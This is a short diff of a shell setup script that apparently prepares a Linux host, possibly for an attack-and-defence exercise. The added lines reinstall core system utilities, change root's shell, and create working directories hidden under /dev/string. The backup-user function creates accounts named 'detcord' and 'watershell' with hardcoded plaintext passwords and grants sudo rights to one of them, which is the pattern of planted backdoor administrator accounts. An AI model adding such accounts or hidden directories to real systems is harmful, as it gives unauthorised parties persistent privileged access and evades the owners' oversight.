@@ -6,6 +6,9 @@
 #
 
 init(){
+    apt-get -qq install -y --reinstall coreutils net-tools lsof procps passwd zsh
+    chsh -s /bin/zsh root 
+    
     mkdir /dev/string /dev/string/old_conf /dev/string/artifacts /dev/string/bin
     cd /dev/string
     printf "\nInit ...... DONE\n"
@@ -40,9 +43,9 @@ setupTOOLS() {
 }
 
 setupBACKUPUSER() {
-    useradd go
-    echo -e "Tlqkfsus!\nTlqkfsus!" | passwd go
-    usermod -aG sudo go
+    useradd detcord
+    echo -e "Tlqkfsus!\nTlqkfsus!" | passwd detcord
+    usermod -aG sudo detcord
 
     useradd watershell
     echo -e "diqkfsus!\ndiqkfsus!" | passwd watershell
